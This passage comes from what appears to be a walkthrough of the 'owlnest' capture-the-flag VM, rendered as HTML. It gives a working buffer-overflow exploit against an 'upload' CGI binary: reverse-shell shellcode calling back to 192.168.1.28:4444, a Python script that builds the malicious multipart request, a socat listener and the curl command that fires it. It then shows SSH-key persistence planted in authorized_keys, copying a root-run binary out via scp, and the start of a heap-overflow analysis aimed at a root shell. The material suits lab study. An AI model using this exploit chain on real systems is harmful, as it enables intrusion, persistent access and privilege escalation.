</span><span class="s">-----------------------------1802089588215914701439635166</span>
<span class="s">Content-Disposition: form-data; name=&quot;description&quot;</span>

<span class="s">description</span>
<span class="s">-----------------------------1802089588215914701439635166</span>
<span class="hll"><span class="s">Content-Disposition: form-data; name=&quot;uploadfield&quot;; filename=&quot;$FILENAME&quot;</span>
</span><span class="s">Content-Type: text/plain</span>

<span class="s">foo foo foo</span>

<span class="s">-----------------------------1802089588215914701439635166--</span>
<span class="s">EOF</span>
<span class="hll">unix2dos request.txt
</span>
<span class="nb">unset</span> QUERY_DATA
<span class="hll"><span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$CONTENT_TYPE</span><span class="s2">&quot;</span> ./upload &lt; request.txt
</span>ls -la /var/www/images
dmesg <span class="p">|</span> tail -n <span class="m">1</span>
<span class="c1"># results in</span>
<span class="hll"><span class="c1"># [ 7718.408449] upload[1921]: segfault at 42424242 ip 0000000042424242 sp 00000000ffe5e7a0 error 14</span>
</span></pre></div>
</div>
<p>You can see segfault at 42424242 or 4 B’s; we nailed the return address. So now all we need is a shellcode exploit that returns a reverse shell to us.</p>
<p>Since the <code class="file docutils literal notranslate"><span class="pre">/var/www</span></code> directory did not exist on my host I’ll remove it here via <code class="docutils literal notranslate"><span class="pre">$SUDO</span> <span class="pre">rm</span> <span class="pre">-rf</span> <span class="pre">/var/www</span></code>.</p>
</div>
<div class="section" id="generate-start-reverse-shell-for-upload">
<h4>3.2.3.1.5. Generate &amp; start reverse shell for <code class="file docutils literal notranslate"><span class="pre">upload</span></code><a class="headerlink" href="#generate-start-reverse-shell-for-upload" title="Permalink to this headline">¶</a></h4>
<div class="section" id="generate-the-shellcode">
<h5>3.2.3.1.5.1. Generate the shellcode<a class="headerlink" href="#generate-the-shellcode" title="Permalink to this headline">¶</a></h5>
<p>We’re looking for a reverse shell shellcode. There are 2 equivalent ways of generating the shellcode. Select a shellcode from <a class="reference external" href="http://shell-storm.org/shellcode/">Shellcodes database for study cases</a>. You would hand-edit the shellcode to reflect the reverse target’s ip/port. Another way is to use gdb with <a class="reference external" href="https://github.com/longld/peda">longld/peda</a> (follow link for installation instructions) to generate the reverse shellcode. Here is the <strong class="program">gdb</strong> command using <strong class="program">peda</strong>’s shellcode generator:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">gdb -batch -ex <span class="s2">&quot;shellcode generate x86/linux connect </span><span class="nv">$PORT</span><span class="s2"> </span><span class="nv">$KALI</span><span class="s2">&quot;</span>
</span></pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># x86/linux/connect: 70 bytes</span>
<span class="c1"># port=4444, host=192.168.1.28</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s2">&quot;</span><span class="se">\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59</span><span class="s2">&quot;</span>
    <span class="s2">&quot;</span><span class="se">\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x1c\x66\x68</span><span class="s2">&quot;</span>
    <span class="s2">&quot;</span><span class="se">\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd</span><span class="s2">&quot;</span>
    <span class="s2">&quot;</span><span class="se">\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53</span><span class="s2">&quot;</span>
    <span class="s2">&quot;</span><span class="se">\x89\xe1\xb0\x0b\xcd\x80</span><span class="s2">&quot;</span> <span class="p">)</span>
</pre></div>
</div>
<p>We’ll assume the owlnest.com machine has ASLR on, so we’ll also need the address of a <code class="docutils literal notranslate"><span class="pre">jmp</span> <span class="pre">esp</span></code> instruction (so we are independent of the stack location):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">objdump -M intel -D upload <span class="p">|</span> grep jmp <span class="p">|</span> grep esp
</span><span class="hll"><span class="c1"># returns (only first one shown)</span>
</span><span class="hll"><span class="c1">#  80c75ab:  ff e4                  jmp    esp</span>
</span></pre></div>
</div>
</div>
<div class="section" id="add-the-shellcode-to-the-request">
<h5>3.2.3.1.5.2. Add the shellcode to the request<a class="headerlink" href="#add-the-shellcode-to-the-request" title="Permalink to this headline">¶</a></h5>
<p>To avoid ASLR, we’ll overwrite the return address (bytes 277-280) with the address of a <code class="docutils literal notranslate"><span class="pre">jmp</span> <span class="pre">esp</span></code> instruction. So our email domain will look something like: “276 bytes of NOP instructions” + “jmp esp” + “shellcode”. So when the validateEmail routine returns, the return address has the address of <code class="docutils literal notranslate"><span class="pre">jmp</span> <span class="pre">esp</span></code> stored there, so execution picks up with the shellcode. Note that if the shellcode itself needed the stack for computations, we would insert an instruction between “jmp esp” &amp; “shellcode” to subtract a big enough number from esp to move the stack beyond the shell code.</p>
<p>Copy the following python script to <code class="docutils literal notranslate"><span class="pre">request.py</span></code>, <strong>changing the shellcode assignment to the one you generated</strong>:</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="hll"><span class="c1"># vvvvvvvvvvvvvvvvvvvvv CHANGE TO YOUR SHELLCODE vvvvvvvvvvvvvvvvvvvvv</span>
</span><span class="hll"><span class="c1"># gdb -batch -ex &quot;shellcode generate x86/linux connect  $PORT $KALI&quot;</span>
</span><span class="hll"><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
</span><span class="hll">    <span class="s2">&quot;</span><span class="se">\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59</span><span class="s2">&quot;</span>
</span><span class="hll">    <span class="s2">&quot;</span><span class="se">\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x1c\x66\x68</span><span class="s2">&quot;</span>
</span><span class="hll">    <span class="s2">&quot;</span><span class="se">\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd</span><span class="s2">&quot;</span>
</span><span class="hll">    <span class="s2">&quot;</span><span class="se">\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53</span><span class="s2">&quot;</span>
</span><span class="hll">    <span class="s2">&quot;</span><span class="se">\x89\xe1\xb0\x0b\xcd\x80</span><span class="s2">&quot;</span> <span class="p">)</span>
</span><span class="hll"><span class="c1"># ^^^^^^^^^^^^^^^^^^^^^ CHANGE TO YOUR SHELLCODE ^^^^^^^^^^^^^^^^^^^^^</span>
</span><span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x080c75ab</span><span class="p">)</span>        <span class="c1"># address of &quot;jmp esp&quot;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">276</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="n">request</span> <span class="o">=</span> <span class="p">(</span>
<span class="s2">&quot;-----------------------------1802089588215914701439635166</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">name</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;name</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;-----------------------------1802089588215914701439635166</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">email</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;user@&quot;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;-----------------------------1802089588215914701439635166</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">description</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;description</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;-----------------------------1802089588215914701439635166</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">uploadfield</span><span class="se">\&quot;</span><span class="s2">; filename=</span><span class="se">\&quot;</span><span class="s2">exploit.txt</span><span class="se">\&quot;\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;Content-Type: text/plain</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;boo&quot;</span>
<span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="s2">&quot;-----------------------------1802089588215914701439635166</span><span class="se">\r\n</span><span class="s2">&quot;</span>
<span class="p">)</span>
<span class="k">print</span> <span class="n">request</span>
</pre></div>
</div>
</div>
<div class="section" id="start-listener-prior-to-shellcode-execution">
<h5>3.2.3.1.5.3. Start listener prior to shellcode execution<a class="headerlink" href="#start-listener-prior-to-shellcode-execution" title="Permalink to this headline">¶</a></h5>
<p>In another window on the reverse shell target, generate a ssh key for use later, then start up a listener:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">ssh-keygen -q -P <span class="s1">&#39;&#39;</span> -C hacker -f id_rsa
</span><span class="hll">cat id_rsa.pub
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCuB0p3QbNmhsDelwSkJo5rvENpdJKwoKdb5EVaVo+VW6RmF6eNlpI36vo2szGByE0syzxusW9HKwQNujqjXzSdhLVcSFKm1sogUV0TwxEfuF9jp+RJrwousntoOmZhheHM/1cAlkkei7nFUxsXGo1BbK1G9WTnc8vifDFm9cEAm9+3+ZiHm1PKoX5OeI2V8BtMaO2iZ1qvnfVlfnUTEA2da0oAIDIMonPOyrBtUmtFdzjUkVLIcyRX/eIeJYA0iMTogGBEqLJjXCxSNvJSLh3cC2ojz0A87dRY2fY1IwnG6Is3xq8f6NslVuXCxlISzNm6ttpG8tdkesHJarh6hKv pentest-meetup@bitbender.org</span>
</span>
<span class="hll">socat - TCP-LISTEN:<span class="nv">$PORT</span>
</span></pre></div>
</div>
</div>
<div class="section" id="firing-off-the-reverse-shell">
<h5>3.2.3.1.5.4. Firing off the reverse shell<a class="headerlink" href="#firing-off-the-reverse-shell" title="Permalink to this headline">¶</a></h5>
<p>After placing the above python code in <code class="docutils literal notranslate"><span class="pre">request.py</span></code>, kick off the reverse shell:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># Log in using admin/admin</span>
</span><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/login.php&#39;</span>
curl --silent --cookie-jar <span class="nv">$COOKIES</span> <span class="se">\</span>
  --data-urlencode <span class="s2">&quot;username=admin&quot;</span> <span class="se">\</span>
  --data-urlencode <span class="s2">&quot;password=admin&quot;</span> <span class="se">\</span>
  <span class="nv">$URL</span>
<span class="c1"># results in</span>
<span class="c1"># Successfully Logged in</span>

<span class="hll"><span class="c1"># Fire off reverse shell</span>
</span><span class="hll"><span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s1">&#39;Content-Type: multipart/form-data; boundary=---------------------------1802089588215914701439635166&#39;</span>
</span><span class="hll">python request.py &gt; request.txt
</span><span class="hll">curl --cookie <span class="nv">$COOKIES</span> -X POST -H <span class="s2">&quot;</span><span class="nv">$CONTENT_TYPE</span><span class="s2">&quot;</span> --data-binary @request.txt <span class="se">\</span>
</span><span class="hll">    http://owlnest.com/application/upload
</span></pre></div>
</div>
<p>At this point the reverse shell should work, so switch to the listener’s terminal window. First order of work is to set up the the ssh key generated earlier to allow SSH access:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>id
<span class="nb">cd</span> /home/rmp
<span class="hll">mkdir .ssh
</span><span class="hll">chmod <span class="m">700</span> .ssh
</span><span class="hll"><span class="c1"># User your id_rsa.pub value here</span>
</span><span class="hll"><span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCuB0p3QbNmhsDelwSkJo5rvENpdJKwoKdb5EVaVo+VW6RmF6eNlpI36vo2szGByE0syzxusW9HKwQNujqjXzSdhLVcSFKm1sogUV0TwxEfuF9jp+RJrwousntoOmZhheHM/1cAlkkei7nFUxsXGo1BbK1G9WTnc8vifDFm9cEAm9+3+ZiHm1PKoX5OeI2V8BtMaO2iZ1qvnfVlfnUTEA2da0oAIDIMonPOyrBtUmtFdzjUkVLIcyRX/eIeJYA0iMTogGBEqLJjXCxSNvJSLh3cC2ojz0A87dRY2fY1IwnG6Is3xq8f6NslVuXCxlISzNm6ttpG8tdkesHJarh6hKv pentest-meetup@bitbender.org&#39;</span> &gt; .ssh/authorized_keys
</span><span class="hll">chmod <span class="m">600</span> .ssh/authorized_keys
</span><span class="nb">exit</span>
</pre></div>
</div>
<p>Now we are set to SSH as rmp to owlnest.com.</p>
</div>
</div>
</div>
<div class="section" id="exploit-port-31337">
<h3>3.2.3.2. Exploit port 31337<a class="headerlink" href="#exploit-port-31337" title="Permalink to this headline">¶</a></h3>
<div class="section" id="download-adminconsole">
<h4>3.2.3.2.1. Download <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code><a class="headerlink" href="#download-adminconsole" title="Permalink to this headline">¶</a></h4>
<p>Now SSH to owlnest as rmp. We immediately find <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code>, the program running on port 31337. <code class="file docutils literal notranslate"><span class="pre">/etc/xinetd.d/adminconsole</span></code> shows it’s started as root so we download it to Kali for further analysis.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">ssh -i id_rsa rmp@owlnest.com
</span>rmp@owlnest:~$ ls
adminconsole  chargen  daytime  discard  <span class="nb">echo</span>  <span class="nb">time</span>
<span class="hll">rmp@owlnest:~$ ./adminconsole
</span><span class="hll">        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
</span><span class="hll">        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
</span><span class="hll">        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class="hll">       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
</span><span class="hll">       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
</span><span class="hll">   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
</span><span class="hll">        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class="hll">
</span><span class="hll">This is the OwlNest Administration console
</span><span class="hll">
</span><span class="hll">Type Help <span class="k">for</span> a list of available commands.
</span><span class="hll"><span class="c1"># cntl-D to exit adminconsole</span>
</span>rmp@owlnest:~$ ps -ef <span class="p">|</span> grep xinetd
root      <span class="m">2595</span>     <span class="m">1</span>  <span class="m">0</span> Aug23 ?        <span class="m">00</span>:00:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
rmp       <span class="m">3293</span>  <span class="m">3054</span>  <span class="m">0</span> <span class="m">02</span>:30 pts/0    <span class="m">00</span>:00:00 grep xinetd

<span class="hll">rmp@owlnest:~$ cat /etc/xinetd.d/adminconsole
</span><span class="c1"># default: on</span>

service adminconsole
<span class="o">{</span>
  <span class="nv">port</span> <span class="o">=</span> <span class="m">31337</span>
  <span class="nb">type</span> <span class="o">=</span> UNLISTED
  <span class="nv">socket_type</span> <span class="o">=</span> stream
  <span class="nb">wait</span> <span class="o">=</span> no
<span class="hll">  <span class="nv">user</span> <span class="o">=</span> root
</span>  <span class="nv">server</span> <span class="o">=</span> /home/rmp/adminconsole
  <span class="nv">log_on_success</span> <span class="o">+=</span> USERID PID HOST EXIT DURATION
  <span class="nv">log_on_failure</span> <span class="o">+=</span> USERID HOST ATTEMPT
  <span class="nv">disable</span> <span class="o">=</span> no
<span class="o">}</span>
<span class="hll">rmp@owlnest:~$ <span class="c1"># scp the file to KALI - change below to your userid@ip</span>
</span><span class="hll">rmp@owlnest:~$ scp adminconsole hacker@192.168.1.28:pentest/owlnest/exploit/
</span><span class="hll">rmp@owlnest:~$ rm ~/.ssh/known_hosts
</span></pre></div>
</div>
</div>
<div class="section" id="analyze-adminconsole">
<h4>3.2.3.2.2. Analyze <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code><a class="headerlink" href="#analyze-adminconsole" title="Permalink to this headline">¶</a></h4>
<p>Analyze the binary <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code> just like <code class="file docutils literal notranslate"><span class="pre">upload</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="nv">P</span><span class="o">=</span>adminconsole
</span><span class="hll">objdump -s --section .comment <span class="nv">$P</span>    <span class="c1"># compiler?</span>
</span><span class="hll">ldd <span class="nv">$P</span>    <span class="c1"># statically linked</span>
</span><span class="hll">readelf --segments <span class="nv">$P</span>    <span class="c1"># ELF segments</span>
</span><span class="hll">readelf --sections <span class="nv">$P</span>    <span class="c1"># ELF sections (contained in segments)</span>
</span><span class="hll">./checksec --file <span class="nv">$P</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># No RELRO, No canary found, NX disabled, No PIE, No RPATH, No RUNPATH, FORTIFY Yes</span>
</span><span class="hll">./checksec --fortify-file <span class="nv">$P</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># 4/51 FORTIFIED syslog_chk, vfprintf_chk, vfprintf_chk, vsyslog_chk</span>
</span>
<span class="hll"><span class="c1"># Get a smallish list of 19 symbols for analysis</span>
</span><span class="hll">nm -g <span class="nv">$P</span> <span class="p">|</span> grep -v <span class="s1">&#39; _&#39;</span> <span class="p">|</span> grep <span class="s1">&#39; T &#39;</span> <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f3 <span class="se">\</span>
</span><span class="hll">    <span class="p">|</span> sort <span class="p">|</span> tee <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_symbols.txt
</span><span class="hll"><span class="c1"># show libc version on Kali</span>
</span><span class="hll">ldd --version
</span><span class="hll"><span class="c1"># results in 2.19</span>
</span><span class="hll"><span class="c1"># Get symbols in 32 bit libc</span>
</span><span class="hll">nm -D /lib32/libc-2.19.so <span class="p">|</span> grep -v <span class="s1">&#39; _&#39;</span> <span class="p">|</span> grep <span class="s1">&#39; T &#39;</span> <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f3 <span class="se">\</span>
</span><span class="hll">    <span class="p">|</span> sort <span class="p">|</span> tee <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_libc.txt
</span><span class="hll"><span class="c1"># List symbols only in $P</span>
</span><span class="hll">comm -23 <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_symbols.txt <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_libc.txt <span class="p">|</span> tee <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_uniq.txt
</span><span class="hll"><span class="c1"># results in 19 routines</span>
</span></pre></div>
</div>
<p>Of the 19 routines left, all but 4 are library routines: loadPasswordFromFile, main, printBanner, printHelp. We’ll concentrate on loadPasswordFromFile and main, assuming that the simple printBanner and printHelp are too easy to mess up.</p>
</div>
<div class="section" id="disassemble-adminconsole">
<h4>3.2.3.2.3. Disassemble <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code><a class="headerlink" href="#disassemble-adminconsole" title="Permalink to this headline">¶</a></h4>
<p>To disassemble <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="k">for</span> s in loadPasswordFromFile main printBanner printHelp <span class="p">;</span> <span class="k">do</span>
</span><span class="hll">  gdb -batch -ex <span class="s1">&#39;file adminconsole&#39;</span> -ex <span class="s2">&quot;disassemble </span><span class="nv">$s</span><span class="s2">&quot;</span>
</span><span class="hll"><span class="k">done</span>
</span></pre></div>
</div>
<p>Before we delve into the disassembled code, here’s a few tips to aid code reading.
The code make reference to hex addresses like “0x80abad4”; you can view the contents via either <code class="docutils literal notranslate"><span class="pre">gdb</span> <span class="pre">-batch</span> <span class="pre">-ex</span> <span class="pre">'file</span> <span class="pre">adminconsole'</span> <span class="pre">-ex</span> <span class="pre">'x/s</span> <span class="pre">0x80abad4'</span></code> for a string, or substitute “x/x” for “x/s” to look at a hex dump.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gdb -batch -ex <span class="s1">&#39;file adminconsole&#39;</span> -ex <span class="s1">&#39;x/s 0x80abad4&#39;</span>
<span class="hll"><span class="c1"># 0x80abad4:  &quot;\r\n&quot;</span>
</span>gdb -batch -ex <span class="s1">&#39;file adminconsole&#39;</span> -ex <span class="s1">&#39;x/s 0x80abbb8&#39;</span>
<span class="hll"><span class="c1"># 0x80abad4:  &quot;rb&quot;</span>
</span>gdb -batch -ex <span class="s1">&#39;file adminconsole&#39;</span> -ex <span class="s1">&#39;x/s 0x80abbbb&#39;</span>
<span class="hll"><span class="c1"># &quot;/root/password.txt&quot;</span>
</span>gdb -batch -ex <span class="s1">&#39;file adminconsole&#39;</span> -ex <span class="s1">&#39;x/x 0x80ca4c4&#39;</span>
<span class="hll"><span class="c1"># 0x80ca4c4 &lt;stderr&gt;:  0x080ca1e0</span>
</span></pre></div>
</div>
<p>There are also some bss section globals used in the program:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">nm adminconsole | grep &#39; B &#39; | grep -v &#39; _&#39; | sort</span>
</span><span class="gp">#</span> results in
<span class="gp">#</span> <span class="m">00000010</span> B errno
<span class="hll"><span class="gp">#</span> 080cc2a0 B password
</span><span class="hll"><span class="gp">#</span> 080cc2c0 B auth
</span><span class="hll"><span class="gp">#</span> 080cc2e0 B yourpassword
</span><span class="hll"><span class="gp">#</span> 080cc300 B <span class="nb">pwd</span>
</span><span class="hll"><span class="gp">#</span> 080cc304 B privileges
</span></pre></div>
</div>
<p>The globals password, auth, yourpassword, pwd, and privileges are in the .bss segment but their acutal data is allocated on the heap. For the curious, consult the following for descriptions of .data, .bss, and the heap:</p>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Data_segment">Data segment</a></li>
<li><a class="reference external" href="http://www.geeksforgeeks.org/memory-layout-of-c-program/">Memory Layout of C Programs</a></li>
<li><a class="reference external" href="http://cs-fundamentals.com/c-programming/memory-layout-of-c-program-code-data-segments.php">Memory Layout of C Program - Code, Data, .BSS, Stack, and Heap Segments</a></li>
</ul>
</div>
<div class="section" id="understanding-adminconsole">
<h4>3.2.3.2.4. Understanding <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code><a class="headerlink" href="#understanding-adminconsole" title="Permalink to this headline">¶</a></h4>
<p>Knowing what and where these globals are stored is key to understanding the exploit. <code class="file docutils literal notranslate"><span class="pre">adminconsole</span></code> provides 5 commands:</p>
<ol class="arabic">
<li><p class="first">help</p>
<p>Lists the 5 commands: help, username, password, privs, login.</p>
</li>
<li><p class="first">username</p>
<p>The actual username specified is ignored. What this is supposed to do is allocate space for filename string “/root/password.txt” and point global auth to that space. What it does instead is allocate space for 4 bytes, initializes them to 0, then proceeds to store string “/root/password.txt” 32 bytes after the 4 allocated bytes. The filename pointed to by global auth is supposed to exist on the owlnest.com server and contain the password you must enter (terminated by “\r\n”).</p>
<p>So two bad things can happen here. If the space 32 bytes after has already been allocated, then string “/root/password.txt” clobbers that space. If the space hasn’t already been allocated, then that data will clobber string “/root/password.txt”.</p>
<p>The exploit hinges on running “username foo” first, then running another command to clobber “/root/password.txt” with another filename (say “/tmp/password.txt” or “/home/rmp/password.txt”) so that we can override the required password.</p>
</li>
<li><p class="first">password</p>
<p>Passwords longer than 30 characters are ignored. Also, if global auth has not been initialized via command username the password is ignored. Otherwise, global yourpassword is set to the provided password. Function loadPasswordFromFile is called to read in the password from the file pointed to by global auth, with the returned password stored first into global pwd, then into global password. A login command will only succeed if global yourpassword = global password. Note that this calls routines that may allocate data on the stack.</p>
</li>
<li><p class="first">privs</p>
<p>Command privs stores an arbitrarily long string in global privs (using storage from the heap). The actual value is ignored by adminconsole. This is a prime candidate to overwrite global auth data. There’s are some caveats: we’re hoping heap memory is allocated sequentially so that the next memory allocation will start between auth and auth+32; we’re hoping nothing else is filling up the heap after command username but before command privs; and we’re potentially going to need a filler at the start of the privs string to position the substitute filename on top of “/root/password.txt”.</p>
</li>
<li><p class="first">login</p>
<p>Command login first prints an error message if the username and password commands have not been run. Next it checks if global yourpassword (the one entered via the password command) and global password (the one read from “/root/password.txt”) are the same. If they are the same, the adminconsole drops into a bash shell (<code class="docutils literal notranslate"><span class="pre">system(&quot;/bin/sh&quot;)</span></code>). Given that adminconsole runs as root, it’s game over.</p>
</li>
</ol>
</div>
<div class="section" id="id25">
<h4>3.2.3.2.5. The exploit<a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h4>
<p>So here’s the outline of the exploit. Set up a password file on owlnest:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

